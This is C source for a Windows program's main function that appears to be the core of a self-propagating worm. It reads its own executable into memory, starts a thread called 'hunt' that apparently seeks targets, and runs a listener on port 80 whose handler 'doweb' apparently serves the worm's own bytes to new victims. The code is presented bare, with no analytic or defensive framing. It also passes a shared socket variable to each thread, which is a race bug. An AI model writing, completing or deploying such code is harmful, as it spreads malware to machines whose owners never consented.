#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>

int main(int argc, char **argv, char **env) {
    WSADATA wsaData;
    SOCKET listen_sock, client_sock;
    SOCKADDR_IN server_addr, client_addr;
    int addr_len = sizeof(client_addr);
    HANDLE hFile;
    DWORD bytesread;
    DWORD threadId;

    if (argc < 1) return 1;

    hFile = CreateFileA(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;

    _sizemybytes = GetFileSize(hFile, NULL);
    if (_sizemybytes == INVALID_FILE_SIZE) { CloseHandle(hFile); return 1; }

    _mybytes = (char *)malloc(_sizemybytes);
    if (!_mybytes) { CloseHandle(hFile); return 1; }

    if (!ReadFile(hFile, _mybytes, _sizemybytes, &bytesread, NULL) || bytesread != _sizemybytes) {
        free(_mybytes);
        CloseHandle(hFile);
        return 1;
    }
    CloseHandle(hFile);

    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
        free(_mybytes);
        return 1;
    }

    setuphostname();

    // Start hunting thread
    CreateThread(NULL, 0, hunt, NULL, 0, &threadId);

    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock == INVALID_SOCKET) {
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(80);

    if (bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
        closesocket(listen_sock);
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    if (listen(listen_sock, 5) != 0) {
        closesocket(listen_sock);
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    while (TRUE) {
        client_sock = accept(listen_sock, (struct sockaddr *)&client_addr, &addr_len);
        if (client_sock == INVALID_SOCKET) continue;
        CreateThread(NULL, 0, doweb, &client_sock, 0, &threadId);
    }

    // Never reached
    closesocket(listen_sock);
    WSACleanup();
    free(_mybytes);
    return 0;
}
